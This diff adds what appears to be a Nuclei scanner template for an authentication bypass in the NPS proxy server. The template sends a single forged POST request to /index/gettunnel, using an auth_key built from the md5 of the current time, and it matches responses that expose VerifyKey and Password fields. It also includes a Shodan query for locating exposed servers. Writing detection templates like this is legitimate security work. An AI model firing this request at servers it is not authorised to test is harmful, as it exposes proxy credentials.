@@ -1,0 +1,44 @@
+id: nps-auth-bypass
+
+info:
+  name: NPS - Authentication Bypass
+  author: SleepingBag945
+  severity: high
+  description: |
+    This will reveal all parameters configured on the NPS, including the account username and password of the proxy.
+  reference:
+    - https://mari0er.club/post/nps.html/
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"window.nps"
+  tags: nps,auth-bypass
+
+http:
+  - raw:
+      - |
+        POST /index/gettunnel HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        auth_key={{md5(unix_time())}}&timestamp={{unix_time()}}&offset=0&limit=10&type=socks5&client_id=&search=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"VerifyKey":'
+          - 'Password":'
+          - 'Id":'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a004730450221009b57a031d7ef0e174a757484d714d12af801e6828d9d7a17ec8d4cc404ffb77a022033a7f62b9e896d0d1a123466ff6dd9adb07a0fe61ec391869cb5d583e86e159d:922c64590222798bb761d5b6d8e72950
